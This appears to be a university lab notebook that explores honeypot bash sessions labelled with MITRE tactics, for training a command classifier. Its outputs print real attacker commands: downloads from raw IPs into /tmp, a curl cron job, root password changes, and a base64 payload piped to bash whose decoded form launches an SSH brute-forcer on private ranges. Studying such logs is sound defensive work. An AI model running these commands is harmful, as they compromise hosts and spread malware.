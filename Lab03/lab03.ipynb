{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/PierfrancescoElia/AICyberLabs/blob/main/Lab03/lab03.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "i_AVzWfvLVZt"
      },
      "source": [
        "# Project 3: Natural Language Processing (NLP)\n",
        "\n",
        "| Member | ID |\n",
        "| -- | -- |\n",
        "| Alessandro Meneghini| s332228 |\n",
        "| Pierfrancesco Elia | s331497 |\n",
        "| Ankesh Porwal | s328746 |\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "T013p6gaNEEJ"
      },
      "outputs": [],
      "source": [
        "import numpy as np\n",
        "import pandas as pd\n",
        "import matplotlib.pyplot as plt\n",
        "import seaborn as sns\n",
        "import torch\n",
        "import torch.nn as nn\n",
        "import torch.optim as optim\n",
        "from sklearn.datasets import make_circles\n",
        "from sklearn.model_selection import train_test_split\n",
        "from sklearn.preprocessing import LabelEncoder, StandardScaler\n",
        "from sklearn.utils.class_weight import compute_class_weight\n",
        "from sklearn.metrics import accuracy_score\n",
        "from sklearn.metrics import classification_report\n",
        "from torch.utils.data import DataLoader, TensorDataset\n",
        "import time\n",
        "from sklearn.model_selection import train_test_split\n",
        "from datasets import Dataset, DatasetDict\n",
        "from transformers import AutoModelForTokenClassification, AutoConfig\n",
        "from torch.optim import AdamW\n",
        "from transformers import DataCollatorForTokenClassification\n",
        "from transformers import get_scheduler\n",
        "from sklearn.metrics import f1_score, precision_score, recall_score, accuracy_score\n",
        "from itertools import chain\n",
        "import numpy as np\n",
        "from copy import deepcopy\n",
        "from torch import cuda\n",
        "from tqdm.auto import tqdm\n",
        "import torch\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7DHgjB2eNIls"
      },
      "source": [
        "## Task 1: Dataset Characterization"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "O-nMcB68NJzJ"
      },
      "outputs": [],
      "source": [
        "# Set random seed for reproducibility\n",
        "np.random.seed(42)\n",
        "\n",
        "\n",
        "# import train and test json\n",
        "train_url = 'https://raw.githubusercontent.com/PierfrancescoElia/AICyberLabs/refs/heads/main/Lab03/train.json'\n",
        "test_url = 'https://raw.githubusercontent.com/PierfrancescoElia/AICyberLabs/refs/heads/main/Lab03/test.json'\n",
        "train_data = pd.read_json(train_url)\n",
        "test_data = pd.read_json(test_url)\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 424
        },
        "id": "83bG3-Zj3CmQ",
        "outputId": "564a038e-5b51-4ebb-cdf9-508e6374bed4"
      },
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "                                               session  \\\n",
              "0    rm -rf /var/run/1sh ; wget -c http://71.127.14...   \n",
              "1    cat /proc/cpuinfo | grep name | wc -l ; echo r...   \n",
              "2    cd /tmp || cd /var/run || cd /mnt || cd /root ...   \n",
              "3    ls -la /dev/ttyGSM* /var/spool/sms/* /var/log/...   \n",
              "4    cat /var/tmp/.systemcache436621 ; echo 1 > /va...   \n",
              "..                                                 ...   \n",
              "246  wget -O /tmp/linux http://58.218.66.87:8080/li...   \n",
              "247  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
              "248  uname -a ; cd /tmp ; wget http://www.studyonaz...   \n",
              "249  cat /proc/cpuinfo | grep name | wc -l ; echo r...   \n",
              "250  echo -e \"*/3 * * * * root (curl -fsSL $url/xms...   \n",
              "\n",
              "                                                 label  \n",
              "0    [Execution, Execution, Execution, Execution, E...  \n",
              "1    [Discovery, Discovery, Discovery, Discovery, D...  \n",
              "2    [Execution, Execution, Execution, Execution, E...  \n",
              "3    [Discovery, Discovery, Discovery, Discovery, D...  \n",
              "4    [Discovery, Discovery, Discovery, Discovery, D...  \n",
              "..                                                 ...  \n",
              "246  [Not Malicious Yet, Not Malicious Yet, Not Mal...  \n",
              "247  [Discovery, Discovery, Discovery, Discovery, D...  \n",
              "248  [Execution, Execution, Execution, Execution, E...  \n",
              "249  [Discovery, Discovery, Discovery, Discovery, D...  \n",
              "250  [Execution, Execution, Execution, Execution, E...  \n",
              "\n",
              "[251 rows x 2 columns]"
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-729764f6-95d0-4a76-be98-ca37c728e8af\" class=\"colab-df-container\">\n",
              "    <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>session</th>\n",
              "      <th>label</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>rm -rf /var/run/1sh ; wget -c http://71.127.14...</td>\n",
              "      <td>[Execution, Execution, Execution, Execution, E...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo r...</td>\n",
              "      <td>[Discovery, Discovery, Discovery, Discovery, D...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>cd /tmp || cd /var/run || cd /mnt || cd /root ...</td>\n",
              "      <td>[Execution, Execution, Execution, Execution, E...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>ls -la /dev/ttyGSM* /var/spool/sms/* /var/log/...</td>\n",
              "      <td>[Discovery, Discovery, Discovery, Discovery, D...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>cat /var/tmp/.systemcache436621 ; echo 1 &gt; /va...</td>\n",
              "      <td>[Discovery, Discovery, Discovery, Discovery, D...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>...</th>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>246</th>\n",
              "      <td>wget -O /tmp/linux http://58.218.66.87:8080/li...</td>\n",
              "      <td>[Not Malicious Yet, Not Malicious Yet, Not Mal...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>247</th>\n",
              "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
              "      <td>[Discovery, Discovery, Discovery, Discovery, D...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>248</th>\n",
              "      <td>uname -a ; cd /tmp ; wget http://www.studyonaz...</td>\n",
              "      <td>[Execution, Execution, Execution, Execution, E...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>249</th>\n",
              "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo r...</td>\n",
              "      <td>[Discovery, Discovery, Discovery, Discovery, D...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>250</th>\n",
              "      <td>echo -e \"*/3 * * * * root (curl -fsSL $url/xms...</td>\n",
              "      <td>[Execution, Execution, Execution, Execution, E...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "<p>251 rows × 2 columns</p>\n",
              "</div>\n",
              "    <div class=\"colab-df-buttons\">\n",
              "\n",
              "  <div class=\"colab-df-container\">\n",
              "    <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-729764f6-95d0-4a76-be98-ca37c728e8af')\"\n",
              "            title=\"Convert this dataframe to an interactive table.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\">\n",
              "    <path d=\"M120-120v-720h720v720H120Zm60-500h600v-160H180v160Zm220 220h160v-160H400v160Zm0 220h160v-160H400v160ZM180-400h160v-160H180v160Zm440 0h160v-160H620v160ZM180-180h160v-160H180v160Zm440 0h160v-160H620v160Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "\n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    .colab-df-buttons div {\n",
              "      margin-bottom: 4px;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "    <script>\n",
              "      const buttonEl =\n",
              "        document.querySelector('#df-729764f6-95d0-4a76-be98-ca37c728e8af button.colab-df-convert');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      async function convertToInteractive(key) {\n",
              "        const element = document.querySelector('#df-729764f6-95d0-4a76-be98-ca37c728e8af');\n",
              "        const dataTable =\n",
              "          await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                    [key], {});\n",
              "        if (!dataTable) return;\n",
              "\n",
              "        const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "          '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "          + ' to learn more about interactive tables.';\n",
              "        element.innerHTML = '';\n",
              "        dataTable['output_type'] = 'display_data';\n",
              "        await google.colab.output.renderOutput(dataTable, element);\n",
              "        const docLink = document.createElement('div');\n",
              "        docLink.innerHTML = docLinkHtml;\n",
              "        element.appendChild(docLink);\n",
              "      }\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "\n",
              "    <div id=\"df-83748b05-82ec-4240-86e8-03575a1bee2d\">\n",
              "      <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-83748b05-82ec-4240-86e8-03575a1bee2d')\"\n",
              "                title=\"Suggest charts\"\n",
              "                style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "      </button>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "      --bg-color: #E8F0FE;\n",
              "      --fill-color: #1967D2;\n",
              "      --hover-bg-color: #E2EBFA;\n",
              "      --hover-fill-color: #174EA6;\n",
              "      --disabled-fill-color: #AAA;\n",
              "      --disabled-bg-color: #DDD;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "      --bg-color: #3B4455;\n",
              "      --fill-color: #D2E3FC;\n",
              "      --hover-bg-color: #434B5C;\n",
              "      --hover-fill-color: #FFFFFF;\n",
              "      --disabled-bg-color: #3B4455;\n",
              "      --disabled-fill-color: #666;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart {\n",
              "    background-color: var(--bg-color);\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: var(--fill-color);\n",
              "    height: 32px;\n",
              "    padding: 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: var(--hover-bg-color);\n",
              "    box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: var(--button-hover-fill-color);\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart-complete:disabled,\n",
              "  .colab-df-quickchart-complete:disabled:hover {\n",
              "    background-color: var(--disabled-bg-color);\n",
              "    fill: var(--disabled-fill-color);\n",
              "    box-shadow: none;\n",
              "  }\n",
              "\n",
              "  .colab-df-spinner {\n",
              "    border: 2px solid var(--fill-color);\n",
              "    border-color: transparent;\n",
              "    border-bottom-color: var(--fill-color);\n",
              "    animation:\n",
              "      spin 1s steps(1) infinite;\n",
              "  }\n",
              "\n",
              "  @keyframes spin {\n",
              "    0% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "      border-left-color: var(--fill-color);\n",
              "    }\n",
              "    20% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    30% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    40% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    60% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    80% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "    90% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "  }\n",
              "</style>\n",
              "\n",
              "      <script>\n",
              "        async function quickchart(key) {\n",
              "          const quickchartButtonEl =\n",
              "            document.querySelector('#' + key + ' button');\n",
              "          quickchartButtonEl.disabled = true;  // To prevent multiple clicks.\n",
              "          quickchartButtonEl.classList.add('colab-df-spinner');\n",
              "          try {\n",
              "            const charts = await google.colab.kernel.invokeFunction(\n",
              "                'suggestCharts', [key], {});\n",
              "          } catch (error) {\n",
              "            console.error('Error during call to suggestCharts:', error);\n",
              "          }\n",
              "          quickchartButtonEl.classList.remove('colab-df-spinner');\n",
              "          quickchartButtonEl.classList.add('colab-df-quickchart-complete');\n",
              "        }\n",
              "        (() => {\n",
              "          let quickchartButtonEl =\n",
              "            document.querySelector('#df-83748b05-82ec-4240-86e8-03575a1bee2d button');\n",
              "          quickchartButtonEl.style.display =\n",
              "            google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "        })();\n",
              "      </script>\n",
              "    </div>\n",
              "\n",
              "  <div id=\"id_7df8cbad-3cfa-43d2-8e9f-45a1ac9e8115\">\n",
              "    <style>\n",
              "      .colab-df-generate {\n",
              "        background-color: #E8F0FE;\n",
              "        border: none;\n",
              "        border-radius: 50%;\n",
              "        cursor: pointer;\n",
              "        display: none;\n",
              "        fill: #1967D2;\n",
              "        height: 32px;\n",
              "        padding: 0 0 0 0;\n",
              "        width: 32px;\n",
              "      }\n",
              "\n",
              "      .colab-df-generate:hover {\n",
              "        background-color: #E2EBFA;\n",
              "        box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "        fill: #174EA6;\n",
              "      }\n",
              "\n",
              "      [theme=dark] .colab-df-generate {\n",
              "        background-color: #3B4455;\n",
              "        fill: #D2E3FC;\n",
              "      }\n",
              "\n",
              "      [theme=dark] .colab-df-generate:hover {\n",
              "        background-color: #434B5C;\n",
              "        box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "        filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "        fill: #FFFFFF;\n",
              "      }\n",
              "    </style>\n",
              "    <button class=\"colab-df-generate\" onclick=\"generateWithVariable('train_data')\"\n",
              "            title=\"Generate code using this dataframe.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "       width=\"24px\">\n",
              "    <path d=\"M7,19H8.4L18.45,9,17,7.55,7,17.6ZM5,21V16.75L18.45,3.32a2,2,0,0,1,2.83,0l1.4,1.43a1.91,1.91,0,0,1,.58,1.4,1.91,1.91,0,0,1-.58,1.4L9.25,21ZM18.45,9,17,7.55Zm-12,3A5.31,5.31,0,0,0,4.9,8.1,5.31,5.31,0,0,0,1,6.5,5.31,5.31,0,0,0,4.9,4.9,5.31,5.31,0,0,0,6.5,1,5.31,5.31,0,0,0,8.1,4.9,5.31,5.31,0,0,0,12,6.5,5.46,5.46,0,0,0,6.5,12Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "    <script>\n",
              "      (() => {\n",
              "      const buttonEl =\n",
              "        document.querySelector('#id_7df8cbad-3cfa-43d2-8e9f-45a1ac9e8115 button.colab-df-generate');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      buttonEl.onclick = () => {\n",
              "        google.colab.notebook.generateWithVariable('train_data');\n",
              "      }\n",
              "      })();\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "    </div>\n",
              "  </div>\n"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "dataframe",
              "variable_name": "train_data",
              "summary": "{\n  \"name\": \"train_data\",\n  \"rows\": 251,\n  \"fields\": [\n    {\n      \"column\": \"session\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 251,\n        \"samples\": [\n          \"ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/* ; /ip cloud print ; echo Hi | cat -n ;\",\n          \"cat /proc/cpuinfo | grep name | wc -l ; echo -e rameauxnvRPi4Y820jEonvRPi4Y820jEo | passwd | bash ; echo rameauxnvRPi4Y820jEonvRPi4Y820jEon | passwd ; echo 321 > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; echo admin rameaux > /tmp/up.txt ; rm -rf /var/tmp/dota* ;\",\n          \"/usr/bin/cat > /usr/libexec/ofhewv ; scp -tr /usr/local/bin/ ; C0755 3435380 ofhewv ; /usr/bin/tar Pxvf - ; /usr/bin/tee /usr/local/bin/ofhewv > /dev/null ;\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"label\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    }\n  ]\n}"
            }
          },
          "metadata": {}
        }
      ],
      "source": [
        "display(train_data)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Rguh55ta3CmV"
      },
      "source": [
        "- **Explore the labels**: How many different tags do you have? How are they distributed\n",
        "(i.e., how many bash words are assigned per tag)? Plot a barplot to show the distribution\n",
        "of tags (both for Train and Test – 2 bars)."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 543
        },
        "id": "DLWDSvnv3CmX",
        "outputId": "56457da0-9c36-4cac-cc04-ff744a958821"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Unique tag values are 7\n",
            "{'Persistence', 'Impact', 'Defense Evasion', 'Other', 'Execution', 'Not Malicious Yet', 'Discovery'}\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 1400x500 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {}
        }
      ],
      "source": [
        "train_labels = []\n",
        "test_labels = []\n",
        "for l in train_data['label']:\n",
        "    train_labels.extend(l)\n",
        "\n",
        "for l in test_data['label']:\n",
        "    test_labels.extend(l)\n",
        "print(f\"Unique tag values are {len(set(train_labels + test_labels))}\")\n",
        "print(set(train_labels + test_labels))\n",
        "\n",
        "\n",
        "fig, axs = plt.subplots(1, 1, figsize=(14, 5))\n",
        "\n",
        "train_tag_counts = pd.Series(train_labels).value_counts().sort_index()\n",
        "test_tag_counts = pd.Series(test_labels).value_counts().sort_index()\n",
        "tag_names = sorted(list(set(train_labels + test_labels)))\n",
        "\n",
        "bar_width = 0.35\n",
        "x = np.arange(len(tag_names))\n",
        "axs.bar(x - bar_width/2, [train_tag_counts.get(tag, 0) for tag in tag_names], width=bar_width, label='Train', color='skyblue')\n",
        "axs.bar(x + bar_width/2, [test_tag_counts.get(tag, 0) for tag in tag_names], width=bar_width, label='Test', color='orange')\n",
        "axs.set_xticks(x)\n",
        "axs.set_xticklabels(tag_names, rotation=30, ha='right')\n",
        "axs.set_title(\"Distribution of MITRE Tactic Tags\")\n",
        "axs.set_ylabel(\"Word Count\")\n",
        "axs.legend()\n",
        "\n",
        "plt.tight_layout()\n",
        "plt.show()"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "PeGRd7Fw3CmY"
      },
      "source": [
        "- **Explore a single bash command – ‘echo’**: how many different tags are assigned? How\n",
        "many times per tag? Can you show 1 example of a session where ‘echo’ is assigned to\n",
        "each of these tactics: ‘Persistence’, ‘Execution’. Can you guess why such examples were\n",
        "labeled differently?"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "fZNtuibX3CmZ",
        "outputId": "1c3720ee-e96a-43d0-d739-616f4bd21e40"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Echo stats: Counter({'Persistence': 104, 'Execution': 39, 'Discovery': 31, 'Not Malicious Yet': 8, 'Impact': 6, 'Other': 4})\n",
            "Found echo session with Persistence and Execution tags:\n",
            " cat /proc/cpuinfo | grep name | wc -l ; echo root:JrBOFLr9oFxB | chpasswd | bash ; echo 321 > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; rm -rf /var/tmp/dota* ; cat /var/tmp/.systemcache436621 ; echo 1 > /var/tmp/.systemcache436621 ; cat /var/tmp/.systemcache436621 ; sleep 15s && cd /var/tmp ; echo IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKbWtkaXIgLlgxMy11bml4CmNkIC5YMTMtdW5peAptdiAvdmFyL3RtcC9kb3RhLnRhci5neiBkb3RhLnRhci5negp0YXIgeGYgZG90YS50YXIuZ3oKc2xlZXAgM3MgJiYgY2QgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MKbm9odXAgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MvdHNtIC10IDE1MCAtUyA2IC1zIDYgLXAgMjIgLVAgMCAtZiAwIC1rIDEgLWwgMSAtaSAwIC90bXAvdXAudHh0IDE3Mi4xNiA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bTsgbm9odXAgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MvdHNtIC10IDE1MCAtUyA2IC1zIDYgLXAgMjIgLVAgMCAtZiAwIC1rIDEgLWwgMSAtaSAwIC90bXAvdXAudHh0IDE5Mi4xNjggPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC90bXAvLlgxMy11bml4LyAmJiBjYXQgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2luaXRhbGwgfCBiYXNoIDI+MSYKZXhpdCAw | base64 --decode | bash ;\n",
            "\n",
            "context of echo with Persistence tag:\n",
            "\t echo root:JrBOFLr9oFxB | chpasswd |\n",
            "\t echo 321 > /var/tmp/.var03522123 ;\n",
            "\n",
            "context of echo with Execution tag:\n",
            "\t echo 1 > /var/tmp/.systemcache436621 ; cat /var/tmp/.systemcache436621 ; sleep 15s\n",
            "\t echo IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKbWtkaXIgLlgxMy11bml4CmNkIC5YMTMtdW5peAptdiAvdmFyL3RtcC9kb3RhLnRhci5neiBkb3RhLnRhci5negp0YXIgeGYgZG90YS50YXIuZ3oKc2xlZXAgM3MgJiYgY2QgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MKbm9odXAgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MvdHNtIC10IDE1MCAtUyA2IC1zIDYgLXAgMjIgLVAgMCAtZiAwIC1rIDEgLWwgMSAtaSAwIC90bXAvdXAudHh0IDE3Mi4xNiA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bTsgbm9odXAgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2MvdHNtIC10IDE1MCAtUyA2IC1zIDYgLXAgMjIgLVAgMCAtZiAwIC1rIDEgLWwgMSAtaSAwIC90bXAvdXAudHh0IDE5Mi4xNjggPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC90bXAvLlgxMy11bml4LyAmJiBjYXQgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2luaXRhbGwgfCBiYXNoIDI+MSYKZXhpdCAw | base64 --decode | bash ;\n"
          ]
        }
      ],
      "source": [
        "from collections import Counter\n",
        "\n",
        "echo_stats = Counter()\n",
        "for words, labels in zip(train_data['session'].str.split(\" \"),train_data['label']):\n",
        "    for word, label in zip(words, labels):\n",
        "        if word == 'echo':\n",
        "            echo_stats[label] += 1\n",
        "print(\"Echo stats:\", echo_stats)\n",
        "\n",
        "found = 0\n",
        "echo_session = None\n",
        "\n",
        "for words, labels in zip(train_data['session'].str.split(\" \"),train_data['label']):\n",
        "    echo_tags = {label for word, label in zip(words, labels) if word == 'echo'}\n",
        "    if 'Persistence' in echo_tags and 'Execution' in labels:\n",
        "        echo_session = (words, labels)\n",
        "        break\n",
        "\n",
        "print(\"Found echo session with Persistence and Execution tags:\\n\", *[i for i in echo_session[0]])\n",
        "print()\n",
        "\n",
        "\n",
        "\n",
        "print(\"context of echo with Persistence tag:\")\n",
        "for j,(word, label) in enumerate(zip(*echo_session)):\n",
        "    if word == 'echo' and label == 'Persistence':\n",
        "        print(\"\\t\", *[i for i in echo_session[0][j:j+5]])\n",
        "print()\n",
        "\n",
        "print(\"context of echo with Execution tag:\")\n",
        "for j,(word, label) in enumerate(zip(*echo_session)):\n",
        "    if word == 'echo' and label == 'Execution':\n",
        "        print(\"\\t\",*[i for i in echo_session[0][j:j+10]])"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6Niu7nl13Cma",
        "outputId": "448e5929-fec1-4d75-e7c8-4dcc203fbf0b"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "#!/bin/bash\n",
            "cd /tmp\t\n",
            "rm -rf .ssh\n",
            "rm -rf .mountfs\n",
            "rm -rf .X13-unix\n",
            "mkdir .X13-unix\n",
            "cd .X13-unix\n",
            "mv /var/tmp/dota.tar.gz dota.tar.gz\n",
            "tar xf dota.tar.gz\n",
            "sleep 3s && cd /tmp/.X13-unix/.rsync/c\n",
            "nohup /tmp/.X13-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 172.16 >> /dev/null 2>1&\n",
            "sleep 8m; nohup /tmp/.X13-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 192.168 >> /dev/null 2>1&\n",
            "sleep 20m && cd /tmp/.X13-unix/ && cat /tmp/.X13-unix/.rsync/initall | bash 2>1&\n",
            "exit 0\n"
          ]
        }
      ],
